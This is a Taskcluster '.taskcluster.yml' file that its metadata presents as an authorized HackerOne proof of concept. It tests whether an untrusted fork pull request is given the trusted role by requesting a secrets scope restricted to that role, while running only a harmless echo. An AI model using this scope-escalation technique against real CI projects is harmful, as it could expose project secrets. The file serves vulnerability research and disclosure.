version: 0
metadata:
  name: "TC v0 scope-escalation PoC (authorized HackerOne research)"
  description: "Non-destructive PoC. This v0 task declares a secrets:get scope that ONLY the trusted pull-request role grants; the task command is a benign echo and never reads any secret. If the task is created and holds this scope, an untrusted fork PR received the trusted role."
  owner: "0xoroot@wearehackerone.com"
  source: "https://github.com/0xoroot/simple-github/blob/canary/.taskcluster.yml"
tasks:
  - provisionerId: "mozilla-1"
    workerType: "decision"
    created: "2026-07-07T13:38:35.000Z"
    deadline: "2026-07-07T15:43:35.000Z"
    expires: "2026-07-08T13:43:35.000Z"
    scopes:
      - "secrets:get:project/mozilla/simple-github/level-1/hackerone-canary"
    extra:
      github:
        events:
          - "pull_request.opened"
          - "pull_request.synchronize"
          - "pull_request.reopened"
    payload:
      image: "ubuntu:22.04"
      maxRunTime: 300
      command:
        - "/bin/bash"
        - "-c"
        - "echo 'HackerOne canary: proving assigned scopes, no secret read'"
    metadata:
      name: "v0 scope-escalation PoC task"
      description: "Authorized HackerOne research. Declares (never reads) a trusted-role-only secret scope."
      owner: "0xoroot@wearehackerone.com"
      source: "https://github.com/0xoroot/simple-github/blob/canary/.taskcluster.yml"
